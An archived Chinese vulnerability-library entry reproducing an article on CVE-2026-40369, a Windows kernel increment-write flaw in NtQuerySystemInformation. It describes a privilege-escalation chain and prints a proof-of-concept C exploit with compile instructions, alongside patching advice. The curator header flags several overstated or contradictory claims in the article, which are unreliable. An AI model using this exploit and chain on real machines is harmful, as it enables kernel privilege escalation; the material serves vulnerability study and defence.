---
source: "gelusus/wxvl 公众号漏洞文库"
title: "Windows kernel 40369信息查询越界递增写提权研究转述"
product: "Windows kernel"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CVE-2026-40369"
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "列Win11 24H2/25H2/26H1、Server2025构建，需MSRC核实"
prerequisites: "本地代码执行；Chrome渲染器先被控制及地址泄露"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
identifier_role: "primary"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/Win/Win%20%E5%86%85%E6%A0%B8%20LPE%20%E6%BC%8F%E6%B4%9E%20PoC%20%E5%85%AC%E5%BC%80%EF%BC%8C%E4%BB%8E%20Chrome%20%E6%B2%99%E7%AE%B1%E4%B9%9F%E8%83%BD%E6%8F%90%E6%9D%83.md"
id: "vw-1224b2b9285a2c3739b7615b"
entity_id: "ve-1224b2b9285a2c3739b7615b"
schema_version: "1"
---

# Windows kernel 40369信息查询越界递增写提权研究转述

## 条目说明

- 对象与具体问题：Windows kernel；40369信息查询越界递增写提权研究转述
- 版本、配置及部署条件：列Win11 24H2/25H2/26H1、Server2025构建，需MSRC核实
- 认证与权限前提：本地代码执行；Chrome渲染器先被控制及地址泄露
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- CVSS7.8称中危错误；Windows11全系列超出列举版本
- 递增次数依赖进程/线程/句柄数且连写12字节，并非任意值精确可控写
- 100%稳定与PoC硬编码未映射地址必蓝屏警告矛盾；只证明原语不是完整SYSTEM提权
- Token权限位设置为SYSTEM简化过度，KASLR模块基址泄露不自动给Token对象地址
- 代码单行粘连include/typedef/return，不可直接编译；ProbeForWrite零长度行为不能单独当根因
- 从Chrome沙箱可调用syscall不保证整个链稳定，临时限制普通用户运行渲染器不现实；迁Windows目录

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

原创 Red Hunter
                    Red Hunter  黑白之道   2026-05-18 00:31  
  
[](https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650617500&idx=1&sn=73c0634d23ef9a5a7ca009cf0e3b1929&scene=21#wechat_redirect)  
> **导语**  
：一个 CVSS 7.8 的漏洞，听起来"只是中危"——但当你知道攻击者可以从 Chrome 沙箱里稳定触发它、直接拿到系统最高权限，你就知道这个分数有多讽刺了。2026年5月12日，微软在每月例行补丁日修复了 CVE-2026-40369。不到一周，GitHub 上已经有了完整的利用代码。利用窗口正在收紧，你准备好了吗？  
  
### 一、漏洞概述：一个"不该存在"的内核地址写入原语  
  
CVE-2026-40369 是 Windows 内核 ntoskrnl.exe 中的一个任意内核地址写入漏洞。普通攻击者只需要具备本地低权限执行能力——哪怕在 Chrome 沙箱这样的受限环境里——就能构造特制的系统调用请求，绕过内核内存保护机制，直接获取系统最高权限。  
  
漏洞的核心关键词：**ProbeForWrite 绕过 + 任意内核地址递增写入**  
。  
  
这两个词搞在一起，就是一个完美的本地权限提升原语。  
### 二、影响范围：Windows 11 全系列中招，Server 2025 也在列  
  
受影响的版本范围：  
- **Windows 11 24H2**  
（Build < 10.0.26100.8457）  
  
- **Windows 11 25H2**  
（Build < 10.0.26200.8457）  
  
- **Windows 11 26H1**  
（Build < 10.0.28000.2113）  
  
- **Windows Server 2025**  
（Build < 10.0.26100.32860）  
  
只要你用的是 Windows 11 或者 Server 2025，并且没打5月12日的补丁，都在这个漏洞的射程内。  
### 三、技术原理：NtQuerySystemInformation 是怎么被滥用的  
  
这部分是核心，耐心看。你不需要懂内核开发，只要跟上逻辑。  
#### 3.1 问题的起点：ProbeForWrite 被"长度=0"绕过  
  
正常情况下，Windows 内核函数在处理用户态传入的内存地址时，会调用一个叫 ProbeForWrite 的函数来做安全检查——它会验证你要写入的内存地址确实是用户态可写的，防止应用程序越界写到内核去。  
  
但这里有个设计缺陷：**如果 Length 参数传的是 0，ProbeForWrite 直接变成空操作（NO-OP）**  
，整个函数体在 Length 检查处就 return 了，根本不执行任何验证。  
  
而 NtQuerySystemInformation 这个系统调用，正好允许你传入任意指针作为输出缓冲区，同时传 Length=0——这意味着攻击者可以把任意内核地址传进去，而 ProbeForWrite 因为长度为0而完全不检查。  
#### 3.2 真正的问题在 ExpGetProcessInformation  
  
NtQuerySystemInformation 有很多信息类别（info class），其中 class 253（SystemProcessInformationExtension）在查询进程信息时会调用 ntoskrnl.exe 里的 ExpGetProcessInformation 函数。  
  
关键问题出在这个函数的第 253 类处理路径上：  
```
// ExpGetProcessInformation 简化逻辑v95 = buffer;  // buffer 是攻击者控制的内核地址（因为 Length=0 绕过了检查）while (NextProcess) {    if (infoClass == 253) {        ++*v95;         // 在攻击者指定的内核地址上做 +1 操作        v95[1] += ...;  // 在地址+4 处累加线程数        v95[2] += ...;  // 在地址+8 处累加句柄数    }}
```  
  
也就是说：**只要调用一次这个系统调用，系统里每存在一个进程，就会在你指定的内核地址上执行一次写操作**  
。addr+0 处会被加上进程总数，addr+4 处会加上所有进程的线程数之和，addr+8 处会加上所有进程的句柄数之和。  
  
这不是普通的内存破坏——这是一个精确可控的写入原语。  
#### 3.3 为什么这么危险：可以从 Chrome 沙箱触发  
  
普通的沙箱逃逸需要几个步骤。但这个漏洞特殊在于：**NtQuerySystemInformation 这个系统调用在 Windows 的很多沙箱限制里都不被阻止**  
。  
  
具体来说：  
- Chrome 沙箱的 win32k lockdown **不阻止这个 syscall**  
  
- 受限令牌（restricted token）**不阻止这个 syscall**  
  
- 不受信任的完整性级别（untrusted integrity level）**不阻止这个 syscall**  
  
换句话说：Chrome 沙箱里的渲染进程，只要能执行代码，就能直接调用这个系统调用拿到 SYSTEM 权限，不需要额外的沙箱逃逸步骤。  
### 四、漏洞利用链：KASLR 泄露 + 内核写入原语 = 完整提权  
  
有了写入原语，还需要解决一个问题：**KASLR（内核地址空间布局随机化）**  
。  
  
内核地址每次启动都是随机的，攻击者不知道把"递增写入"送到哪里才能实现提权。好消息是，GitHub 上的公开 PoC 本身附带了一个 KASLR 泄露模块，利用 prefetch-tool 工具可以从用户态获取内核模块基址——加上这次漏洞的任意写入，就能组合成一条完整的提权链：  
  
**第一步**  
：用 KASLR 泄露获取 ntoskrnl.exe 的基址 **第二步**  
：定位内核 Token 对象（存储进程权限信息的数据结构） **第三步**  
：通过 CVE-2026-40369 的递增写入原语，将当前进程的 Token 权限位设置为 SYSTEM **第四步**  
：此时当前进程已拥有 SYSTEM 权限，启动一个 SYSTEM 级别的 cmd.exe，完成提权  
  
PoC 代码100%确定性稳定触发，不是"可能可以"而是"一定可以"。  
### 五、修复建议：现在就做，不要等  
  
**方法一：Windows Update 自动更新（推荐）**  
  
开启 Microsoft Update 后，系统会自动检测并下载该补丁，下次重启时自动安装。打完补丁后记得重启。  
  
**方法二：手动下载安装**  
  
访问微软官方安全公告页面：https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-40369，选择对应系统版本的补丁进行下载安装，完成后重启。  
  
**方法三：临时缓解**  
  
如果不方便立即更新，可以考虑：  
- 限制非管理员用户运行浏览器渲染进程  
  
- 监控 NtQuerySystemInformation 的异常调用（尤其是 class 253）  
  
- 在 endpoint 防护产品中部署针对性的攻击检测规则  
  
但缓解措施只是拖延时间，**补丁才是最终解决方案**  
。  
### 六、完整 PoC 示例  
  
以下代码来自 GitHub 公开仓库 orinimron123/CVE-2026-40369-EXPLOIT，演示了漏洞的核心原语——任意内核地址递增写入。  
```
#include <windows.h>#include <stdio.h>#pragma comment(lib, "ntdll.lib")typedeflong NTSTATUS;#define SystemProcessInformationExtension 253typedefNTSTATUS(NTAPI *PNtQuerySystemInformation)(    ULONG SystemInformationClass,    PVOID SystemInformation,    ULONG SystemInformationLength,    PULONG ReturnLength);intmain(void){    PNtQuerySystemInformation pNtQSI = (PNtQuerySystemInformation)        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");    // 任意内核地址：攻击者可替换为真实内核对象地址    PVOID target = (PVOID)0xffff800041424344ULL;    printf("[*] NtQuerySystemInformation class 253 arbitrary kernel increment PoC\n");    printf("[*] Target kernel address: %p\n", target);    printf("[*] Will write:\n");    printf("     [target+0] += num_processes (DWORD increment)\n");    printf("     [target+4] += total_threads (DWORD add)\n");    printf("     [target+8] += total_handles (DWORD add)\n");    printf("\n[!] This WILL bugcheck if the address is not mapped writable memory.\n");    printf("[*] Press Enter to trigger...\n");    getchar();    ULONG needed = 0;    NTSTATUS status = pNtQSI(        SystemProcessInformationExtension,        target,   // 内核地址 —— 因为 Length=0，ProbeForWrite 完全被绕过        0,        // Length=0 是绕过关键        &needed    );    printf("[*] NtQuerySystemInformation returned: 0x%08lX\n", status);    printf("[*] Required length: %lu\n", needed);    printf("[+] Done. If you see this, the writes succeeded without bugcheck.\n");    return0;}
```  
  
**编译方式**  
：cl /W4 /O2 poc.c /Fe:poc.exe /link ntdll.lib  
  
注意：上述代码是演示漏洞原理的最小 PoC，完整提权还需组合 KASLR 泄露（可搭配 prefetch-tool）修改内核 Token 对象。  
  
**版权声明**  
：本文由华盟网原创发布，保留所有权利。配图由华盟网授权使用。  
  
> 👇 点击**阅读原文**  
，访问我的网站  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
